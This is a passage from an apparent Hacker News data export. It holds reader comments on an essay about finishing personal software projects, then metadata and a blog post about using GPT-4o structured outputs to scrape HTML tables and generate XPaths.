or completed. Journey is just a distraction at best; typically, it's a source of stress and many yaks to be shaved, most of them stinky and ugly. If anything, I get motivation from ways to shorten the journey. 3) Systems are even worse. If journey is just distracting me from the goal, systems are about putting the goal out of mind entirely, automating it away through habits, changes to environment, etc. While probably[2] effective, systems give me zero motivation - they're too arbitrary, generic. It's a problem that, even in this formulation, I've been trying to solve for almost a decade now. Recently, I've started thinking about what actually motivates me about a project in an ongoing fashion; the insight I had today is that it's a combination of the \"project\" and \"journey\" factors: - The base / fallback motivation is the goal - the benefit I'll get when I reach it. Often, the major one is that someone will be satisfied or impressed. Even more often, it's the relief of getting the consequences of not completing it of my mental threat board, and/or shutting up people who pester me about it. However, that alone is only able to keep the project on my mind; it's not enough to motivate sustained work. - The immediate-term, ongoing motivation is the journey, or specifically the experience of proficiency, and all the interesting tangents I find along the way. It's a necessary condition for me to stay on the task, but I can't treat it as the main motivation itself - when I try, my mind evaluates the value of the activity as zero and pulls emergency brakes; after all, there are much easier ways to get immediate gratification, and there are more important things to do, so if I don't care about reaching the goal, what's the point of going for it in the first place? Systems don't even enter the motivational equation here[3]. I guess what I'm trying to say here is that, in terms of motivation, the completion of a project and the journey to it are two different things entirely; treating them as alternatives is a category error. Also my rambling here is saying that, at this moment, nothing for me has the right combination of \"project\" and \"journey\" factors - otherwise I'd be doing something else than writing HN comments. (And yes, finishing projects completely is hard, because that last 20% of work contains the 80% of chores and annoying tangents that completely ruin the experience of the journey.) -- - [0] - https://en.wikipedia.org/wiki/How_to_Fail_at_Almost_Everythi... - [1] - Via https://www.goodreads.com/quotes/973029-a-goal-is-a-specific... - [2] - Hard to tell, I'm clinically unable to hold a simplest habit to save my life. Forget \"it takes 30 days to ingrain a habit\" - even after months or years of doing something \"habitually\", a smallest disturbance to the daily life is enough to undo all that work and get me back to square one. - [4] - Exception: when I can reframe setting up a system as a kind of a project. Even then, it just makes it easier to build a system; it doesn't help maintaining it over time, which is the whole point of systems in the first place. reply pickledoyster 4 hours agorootparent> how do you enjoy it without the guilt about not doing more important work that leads to more important results? This is a serious suggestion: look into therapy to help you examine what and why you think and feel. For example, seeing some things as more important than others (including one's well being) and reacting to the situation with feelings of guilt are not a given. reply sevensor 6 hours agorootparentprev> Without the \"convenient excuse\", the journey starts looking like pure procrastination; how do you enjoy it without the guilt about not doing more important work that leads to more important results? Procrastination is how I do all my best work. The secret is to set up some boring obligation, bonus points for triviality, and then not do it until the last minute. Meanwhile, work furiously at something else. reply Swizec 21 hours agoparentprev> What if personal projects are not meant to be finished? The key is deciding on 2 things before you start anything: 1. What is the goal? 2. How will I know it’s done? With this approach you can start side projects purely to have fun for an afternoon or to learn a thing or to see how a technology or approach feels. Then you can drop it and move on. Goal achieved, thing learned, no need to keep going. The worst projects in my experience come from unclear goals and fuzzy definitions of done. Those projects tend to drag on forever, burden your life, and fill up your days with busywork. Note that it’s always okay to add additional goals to the same project once you’re done. reply fsndz 20 hours agoprevFinishing is super important. Just focus on completing a version 0. Then, you can improve it if you feel like it. It doesn't have to be perfect, just finished under a reasonable timeframe. Not finishing and endlessly moving from one project to another is bad because it prevents you from making meaningful progress. You end up spreading your efforts too thin and never see the results of your hard work. This can lead to a lack of closure, decreased motivation, and a cycle of unfinished projects that never reach their potential. Moreover, without finishing, you miss out on valuable feedback and the sense of accomplishment that comes from completing a project, which can be crucial for personal and professional growth. reply krisoft 7 hours agoparent> Finishing is super important. Why? > You end up spreading your efforts too thin and never see the results of your hard work. What if the result of my hard work is the lessons I have learned along the way? Or the skills I picked up? Or the time spent entertained? reply jondot 8 hours agoprevGreat description of the problem. I enjoyed reading it, it’s almost like prose, great writing. The solution I’m afraid is only one: solve smaller problems. There is no way a single person can solve a team’s problem as a side project. A small problem does not mean small codebase. It means small as in: focused, simple pain, simple solution, low amount of open questions. Yes there is value to all of the other strategies mentioned. But if you want the root cause and the solution for this hydra effect it is the one I mentioned. If you were born anywhere in the 80s, you might have spent the 90s and early 00s building side projects that you actually finished and felt no remorse over. That’s because scope was naturally small, problems were more focused, and there were multiple order of magnitude less options to choose from (in any domain: programming languages, libraries, interfaces, user flows, business workflows — everything was less) reply myth2018 5 hours agoparent> and there were multiple order of magnitude less options to choose from So true. I remember downloading a bunch of stuff to do some Perl development on Windows 98. About 3MB of files IIRC that took forever to download on my dialup connection. Yet, it was so much easier to focus, basically because there weren't many other options and the .chm files that accompanied the interpreter could keep me busy for hours during the week. Sometimes I try to reproduce that environment by limiting my own options in terms of technologies and learning resources. Probably not the most efficient way to get stuff done, but I find it more sustainable long-term. reply ok_dad 20 hours agoprevI find it’s easier for me to finish physical products, like woodworking, rather than software. I’m building a door right now for my patio, and let me tell you that it’s next to impossible to redo the design of a piece of wood once you’ve milled it down to a certain size or shaped it, so you learn to think very clearly about the goals of a project and the design before you cut anything. In my off time, I don’t want to endlessly struggle to finish things, so I don’t do software. I also do simracing, which also has bite sized goals, like “improve my safety rating to X” or “post three clean laps on a new track”. Though, no matter the hobby, you have to be able to set a small goal and achieve it pretty quick, so I’ll tell myself “just finish the tenons on these frame parts rough, then you can finish them tomorrow.” Edit: To add, I don’t expect perfection from my wood projects. There are gaps and cracks, I use the wrong wood or don’t orient the grains properly, etc. That doesn’t matter, though, because everyone who sees my projects are amazed at my skill, partly because they don’t know where to look for the errors, but also because just finishing anything physical like a door represents a great feat that most won’t even try. It’s different for software, there’s a greater expectation for some reason, or perhaps a virtual product isn’t as tangible as a physical one. reply voidUpdate 10 hours agoparentI've started doing physical things I'm my free time, like making plushies, and I can confirm that it feels a lot easier and more rewarding, because you get to the end of the steps given to you, and its done, and you have a thing you can cuddle. And sure I see all the errors I've made, but like you say, other people don't reply theteapot 19 hours agoparentprev> ... you learn to think very clearly about the goals of a project and the design before you cut anything. Software engineers have been putting serious effort into trying to do that for the last 50+ years with mixed results - one major result being the existence of agile. Software is different to inert physical objects. reply ok_dad 17 hours agorootparentThat’s the whole point I was trying to make, of course. Physical objects are easier to complete. Software never becomes complete, in many cases. reply purple-leafy 20 hours agoprevI’ve mastered this. I’ve finished 12+ projects in the last year. 1 even made money. How? My projects are tiny. If you’re building solo, you have to tackle projects reasonable for a solo dev. I primarily build chrome extensions because the simplest ones can be finished in one night, and the hardest a month or two. It’s frontend only work, so you minimise the project surface area. I’ve only been building them for a year but I finish all of them. And I focus on getting an MVP out, and only polish if I can be bothered. Now that I’ve mastered the finish, I’m moving on to different projects: - API only projects - Scripts - NextJS projects (simple backend) - static pages reply thomassmith65 16 hours agoparentThat's sound advice, but not foolproof, because of two things: (1) what seems, at first, to be a tiny project can turn out to be a big project. (2) with the right mindset, what seems at first to be a large project can turn into a tiny project. And the confusing thing, when trying to reason about this and work more effectively, is that it isn't completely clear to what extent (1) and (2) aren't the same thing. reply purple-leafy 15 hours agorootparent1) this is true, I’ve run into this! 2) I’m yet to run into this reply alex_suzuki 13 hours agoparentprevWhat kind of Chrome extensions? Genuinely curious – it would never occur to me to build one. reply purple-leafy 13 hours agorootparentI’ve built all the following: - Ad blocker/s - Site CSS overrides - Salary revealer for job sites - API blocker - Extended devtools - AI powered UI design feedback tool [0] … and many more [0] - https://chromewebstore.google.com/detail/ui-copilot/hgaldpfd... reply alex_suzuki 8 hours agorootparentMonetized much? reply itqwertz 20 hours agoprevPerfectionism is the enemy of done. It’s a good principle to keep in mind when you’re working on any project so that your valuable time isn’t wasted. Sometimes it is fun to explore something and sometimes it’s better to never start. I have a running list of ideas i will never work on until the opportunity of time and savings align. I’m not sure if it’s common but i heard this quote from an entrepreneur: “There’s nothing worse than a mediocre business “. A bad business will die of its own, a good one sustains itself, and a mediocre one grinds you down. reply Nifty3929 3 hours agoprevI have this with learning piano pieces. The most interesting learning and development occur in the first stages of learning a piece. But \"finishing\" it takes a lot more time and can feel like drudgery - but if I don't push through it on at least some of my pieces then I'll never have anything that's really performable. reply justinclift 10 hours agoprevA phrase that has stuck with me over the years is: A man is measured by the things he finishes, not by the things he starts. Since taking that to heart, I've never really had a problem with finishing things. :) reply anonu 18 hours agoprevJust not enough time in the day. Some open projects of mine that keep me up at night are below. There's probably more but these come to mind. Somewhere between working the day job, spending time with my family, and making sure I take care of my health and stress levels through excercise: I will make incremental progress. 1. rebuild IBM Model-M Keyboard after kids spilled water on it (open for 2 years now) 2. complete floating shelves in office (open since March - 95% done - slowwww) 3. build temperature sensor network for my house using ESPHome firmware and Home Assistant. Hardware purchased. 4. repurpose old 3d printer servo motors to automate etch-a-sketch (popular project out there). Software part started. 5. split-flap display: make my own. research on CAD models for 3d-printing completed. reply khy 3 hours agoprevI think every project passes a threshold after which the time invested will only be considered worthwhile if you ship it. Before this threshold, you're learning new technologies, trying new techniques, and generally developing skills that could be applicable elsewhere. After this threshold, you're becoming an expert in the project itself, which will all be for naught if you don't finish it. So my advice would be give up on projects that are near that threshold, and only continue beyond if you intend to finish it. reply whartung 14 hours agoprevMy current project is a monster. It’s been running hot and cold for at least several years. Progress is being made, but now and again I face something particularly difficult, I can get waylaid. Right now I’m in such an impasse. I was moving along, making some good progress, when I turned a corner and went “oh no”. It’s like hiking a trail and you turn a sharp curve and see it gets really steep. “Ugh” That whooshing sound is the wind falling out of the sails. Right now I’m in a dead calm. But that’s ok. I have several, large subassemblies at the 85% mark, and others to work on that will slot into this thing. I have “shipped” one project. Docs, releases, installers, whole thing. Getting that polished was 2-3 months. (Calendar, these are not full time projects.) Finishing was important because I am not a finisher. I like to say I’m a framer and drywaller. Someone else needs to come in to mud, sand, paint, and trim. I’ve never worked well at that level of detail. It’s another reason I’m not very good with GUIs. Lots of detail. But, these are GUI projects. But also, I shipped my “1.0”. I do not consider it an MVP. No, it’s done. I have no real plans to go back to it. If I were to ship an MVP, that’s just an excuse (for me) to not finish it. And I did not want to leave a lingering carcass. My drive is already filled with those. So I continue to push my boulder in silence. Maybe I can release this thing next year. Waiting for the breeze to come up again. reply jolt42 2 hours agoprevI'm surprised how software can be a real fight with no end in sight, and then boom, it's suddenly \"done\". By \"done\" I guess I mean \"useful\" as it's never done done. reply jdeaton 21 hours agoprevIts not overwhelming clear that finishing is an important piece of a side project. Real work at your job is the place where you can prioritize finishing over other outcomes. By not forcing yourself to finish everything in your side projects you open yourself up to greater levels of exploration and learning which is, after all, the point of side projects to begin with. reply ts330 10 hours agoprevNot going to lie, I read the title as the Art of Fishing... and spent the entire article waiting for the finale where some how this was an analogy with fishing... came for the fish, stayed for the all-too-familiar feeling of incomplete projects. reply super_linear 21 hours agoprevSimilar to \"The Cult of Done Manifesto\" (2009) https://designmanifestos.org/bre-pettis-and-kio-stark-2009-t... reply lifeisstillgood 19 hours agoprevI completely agree, finishing matters, and this reminds of a joke where I said to reply iamflimflam1 8 hours agoprevThere's a really important distinction that should be made between personal \"fun\" projects and professional \"work\" projects. Yes, you should definitely learn what's involved in finishing a work project and how difficult this actually is. The old I'm 80% through and I just need to finish off the last 80% is something that can only be learned by experience. But honestly, why ruin your fun projects by turning them into work. In professional settings, being known as someone who starts things but doesn’t finish them can be detrimental to your career. I would also take issue with this. It may hurt your career, but it may also be your career. Being someone who can break new ground and start a project from nothing can be incredibly valuable and is often a very different skill from putting something into production. reply dailykoder 8 hours agoparent>There's a really important distinction that should be made between personal \"fun\" projects and professional \"work\" projects. I can't support this enough. And it took me years to realize this (again). I often had the same struggles as the blog post states. With my master thesis (and just out of pure curiosity) I built a risc-v CPU as a proof-of-concept (to show that my DDR- and Cache-Controller inteded for a ARMv4 core is somehow portable to a different CPU). Somehow I kept working on it every now and then, because i wanted to make it \"perfect\" (64 bit, FPU, linux, you name it). That ended in much frustration and it still hasn't evolved. But then suddenly I got reminded that in august this year was a sports event that friends of us arrange. For years I wanted to build a kind-of big display which shows the score and remaining time and is visible outside (from like 10m). My perfectionism always ruined. But this time I was determined to do it and get it done. My RISC-V CPU on an FPGA was the perfect fit for this. So I built a co-processor which drives these common RGB LED matrices and shows time and score. The timing itself and a remote where realized with arduino. The code looks utter garbage, it barely works, but I had fun and my friends loved it. And most importantly: I \"finished\" it, as in it worked. I had to force myself really hard to do it. But I enjoyed it and it's fine that it ain't perfect. I also learned a bunch. Now I am determined to improve it for next year and I don't even think about different projects atm. Edit: it was so imperfect, that you couldn't really take pictures of it, because something is wrong with the refresh rate (it looked fine for the human eye): https://litter.catbox.moe/193vp5.jpg reply drewhk 8 hours agoparentprev> But honestly, why ruin your fun projects by turning them into work. Agreed! For fun, it is completely fine to not finish things if you enjoy the process more than the actual result. You achieved your goal of having fun and likely still learned a lot from it. Of course if it bothers you then sure, improve on your ability to close things, but first evaluate if this truly an issue coming internally from yourself, or some imagined external pressure that your work is worthless if you don't finish it (in the hobby context). Is it important to show it to others for example, or is this a solitary activity purely for yourself? In some hobbies I strive to finish, because I want to show it to others, in others, I don't care at all. reply chiefrubberduck 4 hours agoprevi'm reminded by this chapter of the tao te ching: When people see some things as beautiful, other things become ugly. When people see some things as good, other things become bad. Being and non-being create each other. Difficult and easy support each other. Long and short define each other. High and low depend on each other. Before and after follow each other. Therefore the Master acts without doing anything and teaches without saying anything. Things arise and she lets them come; things disappear and she lets them go. She has but doesn't possess, acts but doesn't expect. When her work is done, she forgets it. That is why it lasts forever. reply wseqyrku 21 hours agoprevI think it's all about prioritization. There are ideas that come to mind while implementing something you have in mind that are unnecessary right now by some definition (could be infamously performance- or perhaps convenience-related). If you have a list of all the subcomponents you need (or rather, want to have) I think it's healthy to first sit down and triage everything into some priority buckets and only zoom in on the absolute base functionality first for you to be able to move on to the next step on top of it for it to be able to ship. Note that this step is completely different in nature than what we have already one. After that you can go back and do the next bucket and so on and so forth. reply ChrisMarshallNY 17 hours agoprevI like to ship stuff. I actually get pleasure from releasing stuff into the wild. Shipping, is, by definition, \"finishing.\" Lots of boring stuff involved. Most of my R&D and learning is geared towards shipping projects. I will \"let stuff go,\" if I find I'm in a rabbithole. Learning when to do this, is important. I just let go of some ML stuff for Apple systems, mainly because I can't really apply it [yet] to the types of apps that I'll ship. It wasn't a total loss, though, because I learned that I really need to use Intents for what I want. So, right now, I am learning Intents development for Apple systems. It's a pain, because the documentation is really haphazard, but I'm muddling through. I'll start by adding them to a released app that I tend to use as my \"pointman\" for new stuff, then, I'll add it to some of my other shipping apps. While I'm doing this, I'll become \"conversational\" in the tech. That's how I always learn this stuff. Maybe I'll write something up on it (like I did for Universal Links[0]). [0] https://littlegreenviper.com/series/universal-links/ reply k2so 13 hours agoprevI very strongly relate to this, it's been close to 3 months, since I have started working on a blog built on Quarto, and all I have so far is a elaborate design and a half complete blog on an LLM tool I had built. But like the comments say, I had way too much fun on the journey of a side project, just doing other things like configuring the website and playing around with the design elements like font and how the overall website looks (I'm a data scientist and never usually get to play with design as much as I want to at work). And recently, with claude's help built some cool react elements to push my story further. Hopefully after this, I ship at least one blog and iterate on the design elements. reply adamtaylor_13 19 hours agoprevInterestingly, I’ve learned more from learning to let go from this idea of finishing a useless idea. A “project” doesn’t inherently mean “useful”. Sometimes I’m just dillying around on something useless and eventually I recognize it as such and cancel it. It’s better to just not do things than to do something unnecessary really well. reply hungie 18 hours agoprevNow add neurodivergent executive function disorders -- easily accessible fun things being available prevents bigger picture fun things from starting. I've spent years trying to address this, but haven't found anything that consistently works. Drives me up the wall. reply ww520 18 hours agoprevThere're different currencies driving software development. Your work project is driven by money. Your side project is driven by passion. To push your personal projects to completion, nurture your passion, whatever your passion is. reply gfody 20 hours agoprevthere's probably some cost to having a bunch of unfinished projects occupy my mental bandwidth but I think there are some benefits: - having unfinished projects gives my mind a comfortable place to go think itself out when I'm tired and need to sleep. - each project doubles as a kind of lookout tower providing some perspective on other related projects or relevant technologies, and this keeps me interested in paying attention to new developments in non-superficial ways. - every once in while a spark of motivation will appear for a project I haven't touched in years and it'll be something I recently learned backpropagating constructively, tightening the whole mess up a bit and helping me retain it all. reply shahzaibmushtaq 2 hours agoprevHonestly, it took me about 10-11 hours to finish this article just because I wanted to understand \"The Art of Finishing\", and I totally agreed with what the author was trying to communicate. reply 65 18 hours agoprevProjects I've finished are usually always projects I want more than I want to make them. For example, I made a notes web app that syncs to S3, has full text search, has a \"daily note\" button that auto creates a note for the day, etc. This app was not the most fun and exciting app to make, but I made it anyway because I wanted it to exist. There comes a point in projects where you're in the middle of it and you want to switch and do something else. But if you constantly find the desire for the thing you're making, invariably you'll finish. And it gets more fun after the trough of boredom. reply october8140 18 hours agoparentObsidian.md reply langsoul-com 13 hours agoprevAlways have to keep project scope at bay. We dont have infinite time nor energy, so there's only so much we can do at any one time. Make the goal at the start and ruthlessly discard (note somewhere else) any additional ideas. I find myself giving up projects after coming up with brilliant extensions to the project. When I look at it, it's way too big and immediately demotivating. reply mrbluecoat 4 hours agoprev> Define “Done” from the Start This has helped me tremendously. Great article. reply brikym 20 hours agoprevI really like the orientation of that chart. Next time I put a long time series chart in a document I'm doing time on the Y axis starting from the top. reply andyferris 18 hours agoparentOne famous example worth checking out is this: https://xkcd.com/1732/ Is anyone aware whether Randall Munroe \"invented\" this style of graphic or if it was pre-existing? reply decasia 18 hours agoprevFinishing things (esp. personal projects) feels really good. Leaving them unfinished starts to feel really bothersome. I think the author describes a lot of this really eloquently (while I would also note the irony of writing a meta blog post about this topic during the time when you could have been finishing something). reply maupin 6 hours agoprev> 1. Define “Done” from the Start Impossible for almost any non-trivial project. reply laodabi 12 hours agoprevinstead of finishing my side project, i am reading this post reply blueblimp 20 hours agoprevMy favorite blog post on tips for finishing is this classic by Derek Yu (of Spelunky fame): https://makegames.tumblr.com/post/1136623767/finishing-a-gam.... reply RhysU 18 hours agoparentThe revised content on that topic, found in the Boss Fight book [1], is even better than the blog post. A teaser: > I'm obsessed with finishing as a skill. Over the years, I've realized that so many of the good things that have come my way are because I was able to finish what I started.... Irrespective of how big the project was, each one I finished gave something back to me, whether it was new fans, a new benchmark for what I could accomplish, or new friends that I could work with and learn from. [1] https://bossfightbooks.com/products/spelunky-by-derek-yu reply gjadi 13 hours agoprevCongrats to the author for finishing their article! reply abdussamit 10 hours agoprevLol, I'm not the only one who struggled to finish the article even! God, do distracted. reply fabmilo 17 hours agoprevthe keyword here is at the end of the article: alarming amount of coffee. There is something neurochemical in highly creative people that needs to be counterbalanced artificially. reply voidUpdate 10 hours agoparentSomething I've found while having ADHD is that caffeine has a very different effect than on more NT people, where it makes me more sleepy. Something about it changing brain chemical levels that for an NT person pushes them into an \"alert\" state, but for people with ADHD, it can push them towards a more \"normal\" state reply ilrwbwrkhv 17 hours agoparentprevya maybe you have a point here. i did a lot of work on modafinil back in the day. reply dr_dshiv 19 hours agoprevFrom Drake’s Prayer: “…grant us also to know that it is not the beginning, but the continuing of the same unto the end, until it be thoroughly finished, which yieldeth the true glory” reply codr7 8 hours agoprevI honestly couldn't care less about finishing my personal projects. It's more about moving forward, and dropping projects that aren't interesting anymore. reply quercus 16 hours agoprevCheers to the author for finishing this brilliant essay even if he can't finish his software projects! reply shafiemukhre 15 hours agoprevI have a feeling that the author procrastinated on their project by writing this blog reply fracus 19 hours agoprevThis was a great read. I think the \"define finished\" at the beginning to be useful advice for me. reply anonu 18 hours agoparent\"Definition of Done\" is a common Agile concept. There's a wealth of documentation on how to define it. Heres one: https://www.scrum.org/resources/what-definition-done reply Rugu16 6 hours agoprevGreat read ! May be this js why #buildinpublic helps many creators reply goatmanbah 20 hours agoprevWhen the cost of making a change gets close to zero, it's easy to keep fiddling endlessly... reply sandworm101 4 hours agoprevFinishing is a construct, an escape. No project is ever done. There are always improvements to be made, bugs to be squashed. \"Finished\" is just a label we put on a place on the timeline, a point after which someone is morally allowed to jump ship. Example: I'm in the middle of moving jobs (military to other military). I was given a couple weeks to train my replacement, an impossible task. My boss just asked me if I had \"finished\" training him. Um ... well .. I am leaving. So whatever training we are doing is certainly over. That is what \"finished\" actually is. Is the job finished? Certainly not. But my time as a contributor has come to an end and so I am finished with the task and am jumping ship. reply vjeux 20 hours agoprevLove the illustrations, really great usage of excalidraw! reply Joel_Mckay 18 hours agoprev\"Art is never finished, only abandoned.\" (Leonardo Da Vinci) 1. Clearly identify why your are doing something. 2. Is it really a benefit to _both_ yourself and _society_ . Or are you solving someones issues for a false sense of accomplishment, and silly wages. Note, I do realize the irony of this post, but I find it entertaining so it still meets the criteria. 3. Summarize your time-bounded project goal in one sentence. Example: “I believe that this nation should commit itself to achieving the goal, before this decade is out, of landing a man on the moon and returning him safely to the earth.\" (John F. Kennedy) 4. Draft the probabilistic path forwards, by adding the finish line first. https://en.wikipedia.org/wiki/Program_Evaluation_and_Review_... 5. Identify the key deliverables necessary to meet an MVP in your TRL. This narrows the scope of the project to mitigate feature creep etc. https://en.wikipedia.org/wiki/Technology_readiness_level 6. Are there people with the right skills and motivation to finish each stage of the project? Note, statistically if you are 93% sure you are only really 60% certain on average. 7. Justify the liability of the budget is consistent with personal and corporate budgets. Solving the worlds problems for free may sound noble, but a half-baked attempt is usually foolish, hapless, or destructive to yourself and others. i.e. if the only motive is to make something cheaper, than you will likely end up worse off for the effort. 8. Landing the belly flop... Can deliverables be re-used in other projects? Does the project still meet its goals in commercial, scientific, and or entertainment markets. 9. Start testing the hardest key deliverables first with toy sub-projects. If these don't succeed, than don't bother tooling up with funding for the rest of the project. 10. toy sub-projects are sometimes regression tests, small programs, or key problems with unknown solutions. Expect these to fail or be repurposed 52% of the time, but if they don't work for the intended role than the path is non-viable. Finally, I must observe an interesting phenomena when the probability of completing a key deliverable is below 50%, number more the 3 nodes in a PERT serial traversal, and do not have redundant options. Irrespective of a project complexity, the team will fail to reach its goal regardless of the talent pool, time window, and budget. Best of luck, =3 reply morning-coffee 3 hours agoparentCame to mention same thing I heard from a CS instructor in a freshman class way back in 1987... \"Software is never finished, only abandoned.\" But I'm curious to know details about what this means: > number more the 3 nodes in a PERT serial traversal, and do not have redundant options. Would you mind elaborating or providing a bit more context I can go search on and learn about? Thanks! reply xyzzy4747 18 hours agoprevIt's easier to finish if your goal is to make money - then you are forced to make your customers happy and finish things. If the rewards are nebulous, then so will the motivation to complete anything. reply andrewstuart 21 hours agoprevThe problem is, writing software is REALLY time consuming. It takes months of full time effort to built something that resembles a working application. reply saltcod 19 hours agoprev> a hydra of new challenges Well put. reply surfingdino 11 hours agoprevI decided a while ago that my personal project must either be released as Open Source or commercial software. That keeps me honest, because releasing software as Open Sources exposes it to others so I try to make those projects as good as I can make them and releasing commercial software incentivises me to make it cost me less in support cost. That approach has helped me cull the number of unfinished projects. reply hluska 15 hours agoprevI used to have the same issue then started running and changed my approach. Now: 1.) When you run, you’re only finished training when your body gives out, you die or give up the sport. In software, a product is never really finished; a version is. Therefore if I forget something or mess something up, I already know what tasks to work on for the next version. Forgetting something is bad but it makes planning easier. If finality is scary, turn it into a yield sign. 2.) If you want to run well at a distance, you have to specialize in that distance. If you train for Leadville and the 100m dash simultaneously, you won’t perform as well at either. In software, I work on one version of one product at a time. If I have to choose which one to work on when I sit down, I have already failed. 3.) I’m a human so for me, running is all about pace. Anyone can complete any race if they find and keep their pace. Software is the same. So find your pace and learn how to keep it. When I’m trying to find my pace for a race, I run that pace six days a week regardless of my distance - on shorter days, I’ll add in gliders at the end so I get the workout. With software, I have to keep the same kind of consistency or it takes me too long to get back where I was to ever finish anything. 4.) If you want to run fast so you can see the stars backs for a few moments, you have to treat every single training session just like the race. If you want to run fast enough to be one of the stars, it has to be your whole life. With software, everything even silly side projects gets the same name - product - and I follow the same methods. Practice is always good but deliberate, competitive practice is better. reply richrichie 15 hours agoprevFrontend work is demeaning endless drudgery. My personal trick is not to bother with styling and call it “homemade, organic”. reply alex_suzuki 13 hours agoparent„functional aesthetic“ reply SubiculumCode 17 hours agoprevThe trick is to have a money so that when it becomes boring, you can just set others to finish it... Lol..if only reply jonstewart 17 hours agoprevThe description and feelings resonate, but I've realized a huge drag on my personal projects is the accumulated accidental* complexity due to tools and dependencies. If it's been a few weeks since you were last able to code, then not only have you lost a lot of context in your working memory, but your tools and dependencies will have marched on, and what seems like a harmless update will often result in hours untangling a bug with Someone Else's Code. Fixing Someone Else's Code is not the point of such endeavors. Reduce tooling and dependency complexity to the bare minimum, even if it means adopting a bit of NIH mindset. *as used by Fred Brooks in _No Silver Bullet_, https://www.cgl.ucsf.edu/Outreach/pc204/NoSilverBullet.html reply alva 21 hours agoprevJust what i needed to read today, thanks. reply moridin 19 hours agoprevSeen ! reply Krasnol 21 hours agoprevSomebody should send it to Neal Stephenson reply caporaltito 11 hours agoprevMy guy discovered what Agile really means reply jongjong 19 hours agoprevSomehow, I feel like if a project hasn't become incredibly boring to work on, then it's not even close to finished. The hardest part is finishing a project pre-revenue. There's just little motivation to do it because, at that point, it's too boring to be about the 'journey' anymore; it becomes all about money... Yet you don't know if the project will be able to generate revenue so it's about 'hypothetical money'. As someone who has a huge number of failed projects under their belt, for me it feels like working for 'magic unicorn money'. I rely 100% on the enthusiasm/delusion of my non-technical co-founder to keep me going. In my mind, it's not going to make it... Though I like the fact that my current project is in a niche that I would never have chosen on my own because it's so damn boring (it's in HR search/recruitment sector *vomits*). I was literally optimizing for boringness. I wish I could come up with one of these startups which can be monetized straight away, no free tier, no complex sales funnel but I think these opportunities are very limited and highly competitive. reply irfan786 9 hours agoprev [2 more] [flagged] aqme28 9 hours agoparent [–] Is this an AI summary that misattributes the author of the article to yourself? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The author describes the \"Hydra Project Effect,\" where solving one challenge in a project leads to new challenges, creating a cycle of unfinished work.",
      "To break this cycle, the author suggests strategies such as defining \"done\" from the start, embracing Minimum Viable Product (MVP), time-boxing, and celebrating completions.",
      "The focus is on building habits that increase the likelihood of completing projects, thus fostering real skill growth and reducing the mental weight of unfinished tasks."
    ],
    "commentSummary": [
      "Reframe unfinished projects as opportunities for creative exploration and learning, rather than sources of pressure.",
      "Embrace the process of tinkering and playing, which are crucial for personal and professional growth.",
      "Set realistic goals and deadlines for some projects, while allowing others to remain open-ended to prioritize tasks effectively."
    ],
    "points": 609,
    "commentCount": 147,
    "retryCount": 0,
    "time": 1725310260
  },
  {
    "id": 41428274,
    "title": "Web scraping with GPT-4o: powerful but expensive",
    "originLink": "https://blancas.io/blog/ai-web-scraper/",
    "originBody": "Using GPT-4o for web scraping 5 minute read tl;dr; show me the demo and source code! I’m pretty excited about the new structured outputs feature in OpenAI’s API so I took it for a spin and developed an AI-assisted web scraper. This post summarizes my learnings. Asking GPT-4o to scrape data The first experiment was to straight ask GPT-4o to extract the data from an HTML string, so I used the new structured outputs feature with the following Pydantic models: from typing import List, Dict class ParsedColumn(BaseModel): name: str values: List[str] class ParsedTable(BaseModel): name: str columns: List[ParsedColumn] The system prompt is: You’re an expert web scraper. You’re given the HTML contents of a table and you have to extract structured data from it. Here are some interesting things I found when parsing different tables. Note: I also tried GPT-4o mini but yielded significantly worse results so I just continued my experiments with GPT-4o. Parsing complex tables After experimenting with some simple tables, I wanted to see how the model would do with a more complex ones, so I passed a 10-day weather forecast from Weather.com. The table contains a big row for at the top and smaller rows for the other 9 days. Interestingly, GPT-4o was able to parse this correctly: For the 9 remaining days, the table shows a day and a night forecast (see screenshot above). The model correctly parsed such data and added a Day/Night column. Here’s how it looks like in the browser (note that to display this, we need to click on the button to the right of each row): At first, I thought that the parsed Condition column was a hallucination since I did not see that in the website, however, upon inspecting the source code, I realized that those tags exist but are invisible in the table. Combined rows break the model When thinking where to find easy tables, my first thought was Wikipedia. Turns out, a simple table from Wikipedia (Human development index) breaks the model because rows with repeated values are merged: And while the model is able to retrieve individual columns (as instructed by the system prompt), they don’t have the same size, hence, I’m unable to represent the data as a table. I tried modifying the system prompt with the following: Tables might collapse rows into a single row. If that’s the case, extract the collapsed row as multiple JSON values to ensure all columns contain the same number of rows. But it didn’t work. I have yet to try modifying the system prompt to tell the model to extract rows instead of columns. Asking GPT-4o to return XPaths Running an OpenAI API call every time can become very expensive, so I figured I’d ask the model to return XPaths instead of the parsed data. This would allow me to scrape the same page (e.g., to fetch updated data) without breaking the bank. After some tweaks, I came up with this prompt: You’re an expert web scraper. The user will provide the HTML content and the column name. Your job is to come up with an XPath that will return all elements of that column. The XPath should be a string that can be evaluated by Selenium’s driver.find_elements(By.XPATH, xpath) method. Return the full matching element, not just the text. Unfortunately, this didn’t work well. Sometimes, the model would return invalid XPaths (although this was alleviated with the sentence that mentions Selenium) or XPaths that would return incorrect data or no data at all. Combining the two approaches My next attempt was to combine both approaches: once the model extracted the data, we could use it as a reference to ask the model for the XPath. This worked much better than straight asking for XPaths! I noticed that sometimes the generated XPath would return no data at all so I added some dumb retry logic: if the XPath returns no results, try again. This did the trick for the tables I tested. However, I noticed a new issue: sometimes the first step (extract data) converted images into text (e.g. an arrow pointing upwards might appear in the extracted data as “arrow-upwards”), this caused the second step to fail since it’d look for data that wasn’t there. I did not attempt to fix this problem. GPT-4o is very expensive Scraping with GPT-4o can become very expensive since even small HTML tables can contain lots of characters. I’ve been experimenting for two days and I’ve already spent $24! To reduce the cost, I added some clean up logic to remove unnecessary data from the HTML string before passing it to the model. A simple function that removes all properties except class, id, and data-testid (which are the ones I noticed the generated XPaths were using) trimmed the number of characters in the table by half. I didn’t see any performance degradations and my suspicion is that the results would actually improve extraction quality. Currently, the second step (generate XPaths) makes one model call per column in the table, another improvement could be to generate more than one XPath, I have yet to try this approach and evaluate performance. Conclusions and demo I was surprised by the extraction quality of GPT-4o (but then sadly surprised when I looked at how much I’d have to pay OpenAI!). Nonetheless, this was a fun experiment and I definitely see potential for AI-assisted web scraping tools. I did a quick demo using Streamlit, you can check it out here: https://orange-resonance-9766.ploomberapp.io, the source code is on GitHub (Spoiler: don’t expect anything polished). I wanted to test more tables; however, since that’d involve a higher OpenAI bill, I only tried a handful of them. (check out my startup, if you become a customer, I’ll 